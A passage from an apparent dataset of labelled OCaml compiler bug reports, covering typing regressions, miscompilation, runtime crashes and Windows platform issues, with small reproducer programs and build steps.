block\n**Version:** 4.06.0\n**Target version:** 4.06.1+dev/rc1/rc2\n**Category:** middle end (typedtree to clambda)\n\n## Bug description\n\nIn the example program below, the assertion should never fail but it does fail in 4.06.0 (and not in 4.05.0).\r\n\r\nIf you remove the partial application (definition of f) and do total applications, the problem disappears.\n\n## Steps to reproduce\n\ncompile and run this program:\r\n----------------------------------\r\nlet add_bit ({contents} as t) _ =\r\n  assert (contents = t.contents);\r\n  t.contents <- 1\r\n\r\nlet f = add_bit (ref 0)\r\n\r\n;; f false\r\n;; f false\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7674\n**Reporter:** @nojb\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-04-09T13:02:21Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** standard library\n**Related to:** #7666\n**Monitored by:** @gasche\n\n## Bug description\n\nWhen passing extra (> 2) arguments to Printexc.raise_with_partial_backtrace, a segmentation fault is produced.\r\n\r\nIncidentally, this issue was discovered while working on a solution for #7666, which reported a compilation problem when passing < 2 arguments to this function.\n\n## Steps to reproduce\n\n$ ./ocamlrun ../ocaml\r\n        OCaml version 4.07.0+dev0-2017-09-18\r\n\r\n# let bt = Printexc.get_raw_backtrace ();;\r\nval bt : Printexc.raw_backtrace = <abstr>\r\n# Printexc.raise_with_backtrace Exit bt;;\r\nException: Pervasives.Exit.\r\n# Printexc.raise_with_backtrace Exit bt 1;;\r\nWarning 20: this argument will not be used by the function.\r\nSegmentation fault (core dumped)\n"},{"labels":[null,"bug",null,null],"text":"**Original bug ID:** 7673\n**Reporter:** @alainfrisch\n**Status:** acknowledged (set by @xavierleroy on 2017-11-17T18:18:32Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** minor\n**Category:** platform support (windows, cross-compilation, etc)\n**Monitored by:** @gasche\n\n## Bug description\n\nThe micro benchmark below show radically different performance between the 2 64-bit native Windows ports.\r\n\r\n   msvc64: 1.4s\r\n   mingw64: 3.7s\r\n\r\nAnd this is with VS2008, it does'nt even benefit from recent improvements to the msvc runtime.  I don't know which implementation of exp is used for mingw64 (does it come from msvcrt.dll?).\r\n\r\nRemoving the \"mod 4\" results in oppositive rankings (perhaps because the calculation involves +inf):\r\n\r\n   msvc64: 4.3s\r\n   mingw64: 1.6s\r\n\r\nAnd for \"cos\" instead of \"exp\":\r\n\r\n   msvc64: 1.6s\r\n   mingw64: 4.2s\r\n\r\n\r\nI'm not sure OCaml can do anything specific about it (except ship its own implementation of numerical functions), but just to document the issue and perhaps gather possible simple fixes.  Considering how important \"exp\" can be in some numerical code, knowing about the performance difference might be useful...\n\n## Steps to reproduce\n\n<pre>\r\nlet () =\r\n  let s = ref 0. in\r\n  let n = 100000000 in\r\n  for j = 1 to n do\r\n    s := !s +. exp (float (j mod 4))\r\n  done;\r\n  Printf.printf \"%f\\n%!\" (!s /. float n)\r\n</pre>\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7672\n**Reporter:** @Chris00\n**Status:** acknowledged (set by @xavierleroy on 2017-11-17T18:21:08Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** x86_64\n**OS:** GNU/Linux\n**OS Version:** Debian testing\n**Version:** 4.06.0\n**Category:** standard library\n**Related to:** #6107 #7794\n**Monitored by:** @gasche\n\n## Bug description\n\nWhen quoting several arguments in a command that will be sent to Sys.command, on must also quote the whole string for Windows cmd.   This was discussed in https://github.com/janestreet/jbuilder/issues/322 ; the Windows quoting rules are at \r\n- https://www.borngeek.com/2011/03/22/calls-to-system-in-windows/\r\n- https://stackoverflow.com/a/9965141\r\nGiven these unusual quoting rules, adding a function to quote a full command (such as Filename.quote_command : string list -> string) should be discussed.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7671\n**Reporter:** @sbriais\n**Status:** resolved (set by @xavierleroy on 2017-12-20T17:10:42Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** Windows 32 bits\n**Category:** runtime system and C interface\n**Related to:** #7100\n\n## Bug description\n\nHere is another problem involving big arrays. \r\n\r\nThe reproduction case does the following:\r\n1. allocate a bunch of matrices of floats of small size (1 x 10000).\r\n2. Gc.compact()\r\n3. allocate a medium sized matrice of floats (5000 x 5000)\r\n\r\nOn trunk (c5fe6932), using MSVC Windows 32 bits version of Ocaml, we get an out of memory at step 3.\r\n\r\nHere is the sample program:\r\n\r\nlet pause() =\r\n  print_endline \"Press a key.\";\r\n  ignore (input_line stdin)\r\n\r\nlet main () =\r\n  print_endline \"Pass 1\";\r\n  for i = 0 to 100000 do\r\n    ignore Bigarray.(Array2.create float64 c_layout 1 10000)\r\n  done;\r\n  pause();\r\n  Gc.compact();\r\n  pause();\r\n  print_endline \"Pass 2\";\r\n  ignore Bigarray.(Array2.create float64 c_layout 5000 5000);\r\n  pause()\n\n## File attachments\n\n- [oom.c](https://gist.githubusercontent.com/vicuna/ad038025dc6f789e9e4c0f35d2ab448d/raw/adab2170ed60a376c192a43595422486336ee859/oom.c)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7670\n**Reporter:** @sbriais\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-11-13T14:02:24Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Platform:** Windows 32 bits\n**Category:** runtime system and C interface\n**Duplicate of:** #7100\n\n## Bug description\n\nI made a small reproduction case.\r\n\r\nIt allocates indefinitely a vector of floats of size 10000 (and throw the array immediately).\r\n\r\nOn trunk (c5fe6932), I get an Out of memory.\r\nI use Ocaml on Windows 32 bits, compiled with MSVC.\r\n\r\nHere is the source code:\r\n\r\nlet main () =\r\n    while true do\r\n      ignore Bigarray.(Array1.create float64 c_layout 10000)\r\n    done\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7669\n**Reporter:** @jhjourdan\n**Status:** resolved (set by @xavierleroy on 2018-01-12T12:53:01Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** x86-64\n**OS:** Linux\n**Target version:** 4.06.1+dev/rc1/rc2\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** threads\n**Monitored by:** @gasche @ygrek\n\n## Bug description\n\nWhen using the systhread library with at least one computation intensive thread, the scheduler has very bad behavior. Preemption happens only rarely. This is, for example, demonstrated by the following program when run in native mode :\r\n\r\n  let rec generate_list n =\r\n    let rec aux acc = function\r\n      | 0 -> acc\r\n      | n -> aux (float n :: acc) (n-1)\r\n    in\r\n    aux [] n\r\n\r\n  let long_list = generate_list 1000000\r\n  let short_list = generate_list 100\r\n\r\n  let rec slow_loop () =\r\n    Printf.printf \"SLOW %d\\n%!\" (List.length (List.rev_map sin long_list));\r\n    slow_loop ()\r\n\r\n  let rec fast_loop () =\r\n    Printf.printf \"FAST %d\\n%!\" (List.length (List.rev_map sin short_list));\r\n    fast_loop ()\r\n\r\n  let () =\r\n    ignore (Thread.create slow_loop ());\r\n    fast_loop ()\r\n\r\nIn the output, there are roughly as many \"FAST\" lines as \"SLOW\" lines, meaning that preemption only happens when printing to standard output. I would expect to see much more \"FAST\" lines than \"SLOW\" lines (i.e., the slow computation is preempted by the fast one even if the slow one does not interact).\r\n\r\nNote that both computation do allocate memory through the GC, so the signals used for preemption can indeed be handled. This can be seen by adding the following lines at the beginning of the previous code, which gets the expected behavior:\r\n\r\n  let preempt signal = Thread.delay 1e-6\r\n  let _ =\r\n    Sys.set_signal Sys.sigvtalrm (Sys.Signal_handle preempt);\r\n    ignore (Unix.setitimer Unix.ITIMER_VIRTUAL\r\n               { Unix.it_interval = 1e-2; Unix.it_value = 1e-2 })\r\n\r\nI.e., we periodically force preemption by suspending the currently executing thread for a very short time.\r\n\r\n\r\nMy analysis of the problem is that there are two flaws in the implementation of the systhread library:\r\n\r\n1- The \"tick thread\" regularly sends a signal so that yield() is called regularly. But on linux, the only thing yield() does is releasing and acquiring back the master lock. Since scheld_yield() apparently doesn't do want we want here, one solution could be to use usleep(1) instead. My experiments seem to indicate that the loss in performance is not measurable.\r\n2- Actually, 1- would be fine if the implementation of the masterlock would garantee fairness. But it doesn't. Another soution would therfore to use a fair implementation for the master lock (such as a ticket lock). This should not make the implementation much more complicated, given that the master lock is already implemented \"by hand\".\n\n## File attachments\n\n- [test.ml](https://gist.githubusercontent.com/vicuna/929de942cd71ca82ecc8205c3683831d/raw/52f65462a91d02bf725f362c2168aa9158895688/test.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7668\n**Reporter:** furuse\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-11-06T07:09:49Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.06.0\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** typing\n**Monitored by:** @gasche\n\n## Bug description\n\nThe following code is wrongly type-checked by ocamlc -principal.  I have checked it with 4.05.0 and 4.06.0.  I guess something wrong with the polymorphic variant typing when -principal is given.\r\n\r\n---\r\n\r\nlet partition_map f xs =\r\n  let rec part left right = function\r\n    | [] -> List.rev left, List.rev right\r\n    | x::xs ->\r\n        match f x with\r\n        | `Left v -> part (v::left) right xs\r\n        | `Right v -> part left (v::right) xs\r\n  in\r\n  part [] [] xs\r\n\r\nlet f xs : (int list * int list) = partition_map (fun x -> if x then `Left () else `Right ()) xs\n\n## Steps to reproduce\n\n$ ocamlc -c -i bug.ml\r\nFile \"/tmp/bug.ml\", line 11, characters 35-96:\r\nError: This expression has type unit list * unit list\r\n       but an expression was expected of type int list * int list\r\n       Type unit is not compatible with type int \r\n$ ocamlc -c -i -principal bug.ml\r\nval partition_map :\r\n  ('a -> [< `Left of 'b | `Right of 'c ]) -> 'a list -> 'b list * 'c list\r\nval f : bool list -> int list * int list\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7667\n**Reporter:** @kayceesrk\n**Status:** acknowledged (set by @xavierleroy on 2017-11-05T17:42:51Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** powerpc64le\n**OS:** Linux\n**Category:** back end (clambda to assembly)\n**Related to:** #3086 #3117\n**Monitored by:** @gasche\n\n## Bug description\n\nOn PowerPC Linux, trunk OCaml generates out of range jumps to caml_call_gc label. The bug was triggered while installing alt-ergo.1.01 and magic-mime.1.1.0. \r\n\r\n----\r\n\r\ndebian@ocaml-debian-le:~/.opam/4.07.0+trunk+bench/.opam-switch/build/alt-ergo.1.01$ make\r\nocamlopt.opt -c -annot -inline 100 -I /home/debian/.opam/4.07.0+trunk+bench/lib/zarith  -I /home/debian/.opam/4.07.0+trunk+bench/lib/lablgtk2 -I +threads -I src/util -I src/structures -I src/theories -I src/instances -I src/sat -I src/preprocess -I src/parsing -I src/gui -I src/main -I non-free/plugins/common -I non-free/plugins/satML -I non-free/plugins/profiler -I non-free/plugins/fm-simplex src/theories/intervals.ml\r\n/tmp/camlasma487b4.s: Assembler messages:\r\n/tmp/camlasma487b4.s:15010: Error: operand out of range (0x00000000000080a8 is not between 0xffffffffffff8000 and 0x0000000000007ffc)\r\nFile \"src/theories/intervals.ml\", line 1:\r\nError: Assembler error, input left in file /tmp/camlasma487b4.s\r\nMakefile.users:229: recipe for target 'src/theories/intervals.cmx' failed\r\nmake: *** [src/theories/intervals.cmx] Error 2\r\n\r\n----\r\n\r\nThis bug is a duplicate of #3117 (ocaml/ocaml#3117&history=1) which is marked as fixed (?). Wondering whether the change suggested in #3117 should be incorporated.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7666\n**Reporter:** @hhugo\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-04-09T13:03:29Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Category:** middle end (typedtree to clambda)\n**Related to:** #7674\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nThe primitive \"%raise_with_backtrace\" is miscompiled when not fully applied.\r\n\r\nIntroduced by:\r\nhttps://github.com/ocaml/ocaml/pull/378\n\n## Steps to reproduce\n\n$cat test.ml\r\nlet bt = Printexc.get_raw_backtrace ()\r\nlet f = Printexc.raise_with_backtrace Not_found\r\nlet y = f bt\r\n\r\n$ ocamlc test.ml \r\nFile \"test.ml\", line 1:\r\nError: Error while linking test.cmo:\r\nThe external function `%raise_with_backtrace' is not available\r\nEXIT STATUS 2\r\n\r\n$ ocamlopt test.ml \r\n/tmp/camlasmb473fc.s: Assembler messages:\r\n/tmp/camlasmb473fc.s:39: Error: junk `raise_with_backtrace (%rip)' after expression\r\n/tmp/camlasmb473fc.s:39: Error: missing or invalid immediate expression `25raise_with_backtrace@GOTPCREL(%rip)'\r\n/tmp/camlasmb473fc.s:62: Error: junk `raise_with_backtrace (%rip)' after expression\r\n/tmp/camlasmb473fc.s:62: Error: missing or invalid immediate expression `25raise_with_backtrace@GOTPCREL(%rip)'\r\nFile \"test.ml\", line 1:\r\nError: Assembler error, input left in file /tmp/camlasmb473fc.s\r\nEXIT STATUS 2\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7664\n**Reporter:** russ\n**Status:** resolved (set by @xavierleroy on 2017-10-30T08:31:27Z)\n**Resolution:** won't fix\n**Priority:** normal\n**Severity:** minor\n**Platform:** x64\n**OS:** Windows\n**Version:** 4.05.0\n**Category:** back end (clambda to assembly)\n**Monitored by:** @gasche\n\n## Bug description\n\nAround every C call in 64-bit Windows, the compiler allocates shadow space on the stack for the callee.  It looks like this:\r\n\r\nsub\trsp, 32\r\ncall\tQWORD PTR __caml_imp_get_array_float\r\nadd\trsp, 32\r\n\r\nSince this happens on every C call, it can cause a 50%+ slowdown in a tight loop.  I think these RSP adjustments could be moved into the function entry and epilogue and merged with the existing RSP alignment (sub 8, add 8).  I guess it should only do it if the function actually makes any C calls.\r\n\r\nThis may also be present in the generated assembly for 32-bit Windows, although I haven't checked.\n\n## Steps to reproduce\n\nHere is a simple example where it slows down a call to caml_modify:\r\n\r\ntype foo =\r\n    | Empty\r\n    | Int of int\r\n\r\nlet myarray = Array.make 10000 Empty\r\n    \r\nlet () =\r\n    let xx = Int 100 in\r\n    for z = 0 to 10000 do\r\n        for x = 0 to 9999 do\r\n            Array.set myarray x xx\r\n        done\r\n    done\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7663\n**Reporter:** kosik\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2018-04-04T19:16:46Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Version:** 4.05.0\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** typing\n\n## Bug description\n\nAt some point, when I was trying to compile my program, I got this error message:\r\n\r\n  Error: Cannot safely evaluate the definition\r\n         of the recursively-defined module Foo\r\n\r\nUnless the user read Section 7.4 of the reference manual\r\nand deduces that \"safe evaluation\" might be something closely related to \"safe module\", I do not think that this error message could be of much help to the user.\r\n\r\nSince this topic is subtle (one needs to understand what implementors of Ocaml mean by \"safe module\" and that this is (somehow) closely related to \"safe evaluation\" so I think it would make sense if the error message referred the user for further information to the corresponding place (Section 7.4 of the User's Manual).\r\n\r\nIt would be very helpful if Section 7.4 showed:\r\n- examples of \"unsafe recursive modules\"\r\n- showed what kind of error messages the user then should expect to see\r\n  (\"Cannot safely evaluate the definition of the recursively-defined module Foo\")\r\n- and show how, in a given concrete situation, recursive modules can be converted to \"safe ones\".\r\n\r\nThe most trivial situation I was able to trigger the error (which confused me completely) is this:\r\n\r\n  module rec M1 :\r\n    sig\r\n      val f1 : unit\r\n    end = struct\r\n      let f1 = ()\r\n      let f2 = M2.f1\r\n  end\r\n\r\n  and M2 :\r\n    sig\r\n      val f1 : unit\r\n    end = struct\r\n      let f1 = ()\r\n      let f2 = M1.f1\r\n  end\r\n\r\nIt would be illustrative to show the necessary workaround that enables one to compile programs like these.\r\n(I.e. changing the type of \"M1.f1\" to \"unit -> unit\" or the type of \"M2.f1\" to \"unit -> unit\".)\r\n\r\nPlease consider this as a subjective feedback as this is not really a rigorous area. I am curious what do you think.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7662\n**Reporter:** clouds56\n**Assigned to:** @dra27\n**Status:** acknowledged (set by @dra27 on 2017-10-28T09:48:29Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** win32\n**OS:** Windows 10\n**OS Version:** 1703\n**Version:** 4.02.3\n**Category:** otherlibs\n\n## Bug description\n\nthe caml_search_exe_in_path in win_create_process_native called\r\n\r\n    retcode = SearchPath(NULL,              /* use system search path */\r\n                         name,\r\n                         L\".exe\",            /* add .exe extension if needed */\r\n                         fullnamelen,\r\n                         fullname,\r\n                         &filepart);\r\n\r\nto get fullpath of \"bash.exe\".\r\nwhile according to the remarks in  https://msdn.microsoft.com/en-us/library/windows/desktop/aa365527(v=vs.85).aspx SearchPath would return executable in SystemPath when SafeProcessSearchMode is on, we should run SetSearchPathMode before search.\n\n## Steps to reproduce\n\n1. add C:\\msys64\\usr\\bin to System PATH before C:\\Windows\\System32\r\n\r\n2. run in ocaml:\r\nUnix.create_process_env\r\n    \"bash\"\r\n    [| |]\r\n    (Unix.environment ())\r\n    Unix.stdin Unix.stdout Unix.stderr;;\r\n\r\n3. it would return: (the output is the same as C:\\Windows\\System32\\bash.exe)\r\n-- Beta feature --\r\nThis will install Ubuntu on Windows, distributed by Canonical\r\nand licensed under its terms available here:\r\nhttps://aka.ms/uowterms\r\n\r\nIn order to use this feature you must have Developer Mode enabled.\r\nPress any key to continue...\n\n## Additional information\n\nWhen run \"opam install merlin\", in windows 10. it would call Unix.make_process_env, which would return system \"bash.exe\" instead of the one in PATH.\r\nThe issue blocks install almost all packages with opam.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7661\n**Reporter:** @thizanne\n**Assigned to:** @maranget\n**Status:** resolved (set by @trefis on 2018-01-09T11:56:53Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.05.0\n**Fixed in version:** 4.06.1+dev/rc1/rc2\n**Category:** middle end (typedtree to clambda)\n**Related to:** #5788\n**Monitored by:** @gasche\n\n## Bug description\n\nOn this example, the evaluation of `f A B` doesn't go in the `(A | B) , B` branch. It works as intended if `t` is a non-extensible sum type. If the two first lines of the pattern matching are inverted, then `a` has the unexpected `'_'` value.\r\n\r\n```\r\ntype t = ..\r\ntype t +=\r\n  | A\r\n  | B\r\n\r\nlet f x y = match x, y with\r\n  | (A | B), A -> 'a'\r\n  | (A | B), B -> 'b'\r\n  | _, _ -> '_'\r\n\r\nlet a = f A A (* a : char = 'a' *)\r\nlet b = f A B (* b : char = '_' *)\r\n```\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7660\n**Reporter:** @nojb\n**Status:** resolved (set by @xavierleroy on 2017-12-20T16:59:37Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**OS:** Windows\n**Version:** 4.05.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** otherlibs\n**Monitored by:** @gasche\n\n## Bug description\n\n#7385 strikes back!\r\n\r\nWhen \"Adjust for daylight saving time automatically\" is ON in your Windows settings, the function Unix.utimes can shift the passed timestamp by one hour depending on DST.  If the setting is OFF the timestamp seems to be left unchanged.\r\n\r\nIt MAY be that this bug only became more evident due to the fix for #7385, which solved a similar issue for Unix.stat.  Before that, the two functions's bugs may have cancelled each other. (This is just a guess, I did not verify it.)\n\n## Steps to reproduce\n\n# Set \"Adjust for daylight saving time automatically\" to ON\r\n\r\n$ touch foo.txt\r\n$ ocaml unix.cma\r\n# let t0 = 1508391026.;;\r\nval t0 : float = 1508391026.\r\n# Unix.utimes \"foo.txt\" t0 t0;;\r\n- : unit = ()\r\n# let t1 = (Unix.stat \"foo.txt\").Unix.st_mtime;;\r\nval t1 : float = 1508387426.\r\n# t0 -. t1;;\r\n- : float = 3600.\r\n\r\n# You can check on Cygwin that the mtime is the correct one, so the problem\r\n# is with Unix.utimes, not Unix.stat:\r\n\r\n$ stat --format=%Y foo.txt\r\n1508387426\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7659\n**Reporter:** msk\n**Status:** resolved (set by @xavierleroy on 2017-12-20T17:00:41Z)\n**Resolution:** unable to duplicate\n**Priority:** normal\n**Severity:** major\n**Platform:** x64\n**OS:** LUbuntu\n**OS Version:** 16.04\n**Category:** compiler driver\n\n## Bug description\n\nWhy3 0.83.3 module core/term.mli contains declaration:\r\n\r\nval t_const : Number.constant -> term\r\n\r\nand in core/term.ml:\r\n\r\nlet t_const c ty    = mk_term (Tconst c) (Some ty)\r\n...\r\nlet t_const c = match c with\r\n  | Number.ConstInt _  -> t_const c ty_int\r\n  | Number.ConstReal _ -> t_const c ty_real\r\n\r\n\r\nin ocaml 4.04.2 all works ok, in 4.05.0 real exported type of t_const is the type of first t_const definition in .ml:\r\n\r\nNumber.constant -> Ty.ty -> Term.term (instead of Number.constant -> Term.term)\n\n## Steps to reproduce\n\nSimply try to use Term.t_const function from Why3 library\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7658\n**Reporter:** cspiel\n**Assigned to:** @mshinwell\n**Status:** resolved (set by @mshinwell on 2017-10-20T09:44:28Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Platform:** amd64\n**OS:** GNU/Linux\n**OS Version:** 4.9.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** runtime system and C interface\n\n## Bug description\n\nIf the current git sources (0b09fb56a5bbea5a72a6c1705fced8f8372dd6ff) are\r\nconfigured with `-force-safe-string' the compilation of module \r\n\"spacetime_snapshot.c\" breaks with the following error message:\r\n\r\nIn file included from ../byterun/caml/alloc.h:24:0,\r\n                 from spacetime_snapshot.c:23:\r\nspacetime_snapshot.c: In function âcopy_string_outside_heapâ:\r\n../byterun/caml/mlvalues.h:256:23: error: passing argument 1 of âmemmoveâ discards âconstâ qualifier from pointer target type [-Werror=discarded-qualifiers]\r\n #define String_val(x) ((const char *) Bp_val(x))\r\n                       ^\r\nspacetime_snapshot.c:359:11: note: in expansion of macro âString_valâ\r\n   memmove(String_val(result), s, len);\r\n           ^~~~~~~~~~\r\nIn file included from spacetime_snapshot.c:19:0:\r\n/usr/include/string.h:46:14: note: expected âvoid *â but argument is of type âconst char *â\r\n extern void *memmove (void *__dest, const void *__src, size_t __n)\r\n              ^~~~~~~\r\ncc1: all warnings being treated as errors\n\n## Steps to reproduce\n\n./configure -flambda -force-safe-string -no-naked-pointers -spacetime -with-frame-pointers\r\nmake world.opt\n\n## Additional information\n\nThe origin of this problem sits in file \"mlvalues.h\".  There macro\r\n`String_val' is conditionally defined with respect to `CAML_SAFE_STRING'.\r\n\r\nHowever, the solution will have to be non-trivial as the error points\r\nto the change in semantics, i.e. value vs. address.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7657\n**Reporter:** @sliquister\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @xavierleroy on 2017-10-19T13:25:38Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.05.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Monitored by:** @gasche\n\n## Bug description\n\nThe following program should clearly raise:\r\n\r\n    let foo g () = g 1; ()\r\n    let f ?x y = ()\r\n\r\n    let _ = foo (assert false; f)\r\n\r\nbut it doesn't (with 4.05).\r\n\r\nI think this is because the typer rewrites the argument of foo as:\r\n\r\n    let _ = foo (fun y -> (assert false; f) ?x:None y)\r\n\r\nbecause it calls is_nonexpansive to decide if the expression is side-effect free, which doesn't work for sequences and other cases (the condition of if-then-else, patterns with lazy in them, etc).\r\n\r\n(I didn't run into this in practice, I simply saw the call to\r\nis_nonexpansive and thought that it couldn't be right)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7656\n**Reporter:** jpdeplaix\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-10-13T19:01:32Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Monitored by:** @gasche @Yakobowski\n\n## Bug description\n\nThe attached menhir test-case produces false-positive warnings when all warnings are activated.\n\n## Steps to reproduce\n\nBy compiling the attached menhir file using ocamlbuild:\r\n\r\nocamlbuild -use-menhir -tag \"warn(A-4)\" parser.cmo\r\n\r\nWe get the following warnings:\r\n\r\nFile \"parser.ml\", line 2, characters 0-30:\r\nWarning 34: unused type token.\r\nFile \"parser.ml\", line 2, characters 0-30:\r\nWarning 37: unused constructor Test.\r\nFile \"parser.ml\", line 2, characters 0-30:\r\nWarning 37: unused constructor EOF.\r\nFile \"parser.ml\", line 6, characters 4-23:\r\nWarning 32: unused value menhir_begin_marker.\r\nFile \"parser.ml\", line 9, characters 4-11:\r\nWarning 32: unused value xv_main.\r\nFile \"parser.ml\", line 40, characters 4-21:\r\nWarning 32: unused value menhir_end_marker.\n\n## Additional information\n\nThis does not appear with OCaml 4.05.0. Every unused type/constructor/value are used when looking at the code generated by menhir.\r\n\r\nAlso, I cannot find any of the values listed above, in the generated code (neither menhir_begin_marker, xv_main nor menhir_end_marker).\n\n## File attachments\n\n- [parser.mly](https://gist.githubusercontent.com/vicuna/aa26c658a52a5b44d6147cdacfe0eb01/raw/b6b2aa52f61fda13d9a9d0dc41ed590f5b4517b0/parser.mly)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7655\n**Reporter:** @mmottl\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-10-14T23:43:18Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** text\n**Version:** 4.05.0\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** documentation\n**Monitored by:** @gasche @mmottl\n\n## Bug description\n\nThe manual does not seem to specify the behavior of external function declarations with the [@@noalloc] attribute if both a byte and native code entry point are declared.  Though one would typically expect both entry points to have the same allocation behavior, this is eminently not the case when the function also declares that it returns unboxed values.\r\n\r\nE.g. many numeric functions in Pervasives return unboxed doubles, which have to be explicitly allocated for byte code but not for native code.  The functions are nevertheless declared with [@@noalloc].  I guess the byte code interpreter always ignores this attribute, otherwise the current Pervasives implementation would not be safe.\r\n\r\nI think the expected behavior of [@@noalloc] with byte and native code should be documented in the C-interface section of the manual.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7654\n**Reporter:** bcc32\n**Status:** resolved (set by @xavierleroy on 2017-10-07T15:20:04Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.2\n**Fixed in version:** 4.05.0\n**Category:** compiler driver\n**Monitored by:** @alainfrisch\n\n## Bug description\n\nConsider the following code:\r\n\r\n    module Make (Int : sig val one : int end) = struct\r\n      let () = assert false\r\n      let two () = [Int.one + 1]\r\n    end\r\n\r\n    module M = Make (struct let one = 1 end)\r\n\r\n    let _ = M.two ()\r\n\r\nI get a linker error compiling this code using the native-code compiler.\n\n## Steps to reproduce\n\nCompile with: `ocamlopt test.ml`\n\n## Additional information\n\nExpanded example here: https://gist.github.com/bcc32/e6f3aa69443ea253a6a0719c2748d2e1\r\n\r\nCompiler error output follows:\r\n\r\nUndefined symbols for architecture x86_64:\r\n  \"_camlTest__two_1202\", referenced from:\r\n      _camlTest__entry in test.o\r\nld: symbol(s) not found for architecture x86_64\r\nclang: error: linker command failed with exit code 1 (use -v to see invocation)\r\nFile \"caml_startup\", line 1:\r\nError: Error during linking\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7653\n**Reporter:** @gasche\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-10-09T17:21:23Z)\n**Resolution:** fixed\n**Priority:** high\n**Severity:** major\n**Version:** 4.06.0 +dev/beta1/beta2/rc1\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Monitored by:** @gasche @Yakobowski\n\n## Bug description\n\nUnder 4.06.0+beta1+unsafe-string-default, ocamlc.opt barfs on the file\r\n\r\n  src/kernel_internals/typing/cabs2cil.ml\r\n\r\nof the Frama-C Silicon release (frama-c.20161101):\r\n\r\n  https://github.com/Frama-C/Frama-C-snapshot/blob/master/src/kernel_internals/typing/cabs2cil.ml\r\n\r\nThis is a 4.06 regression, it compiles fine under 4.05.\n\n## Steps to reproduce\n\nopam switch install 4.06.0+beta1+default-unsafe-string\r\nopam install ocamlfind num ocamlgraph.1.8.7\r\ncd /tmp\r\nwget http://frama-c.com/download/frama-c-Silicon-20161101.tar.gz\r\ntar -xzvf frama-c-Silicon-20161101.tar.gz\r\ncd frama-c-Silicon-20161101\r\nwget https://raw.githubusercontent.com/ocaml/opam-repository/master/packages/frama-c-base/frama-c-base.20161101/files/4.05-support.patch\r\npatch -p1 < 4.05-support.patch\r\n./configure\r\nmake\n\n## Additional information\n\nI noticed the problem because on Gallium's beefy machine, the compilation has been running for an hour and has not failed yet (but it now consumes 9Gio of memory).\r\n\r\nOn my personal machine, I just get a stack overflow. In my opam-builder runs on an equally weak machine, I got a nice (but long) stack trace, which I'll upload as a separate file on this issue.\n\n## File attachments\n\n- [backtrace.txt](https://gist.githubusercontent.com/vicuna/8f0ae7a41a7412e71f0376ea70586cc6/raw/c96c66b119effe851868d9c5d575046c4a31f04e/backtrace.txt)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7652\n**Reporter:** @dra27\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-10-26T12:46:16Z)\n**Resolution:** 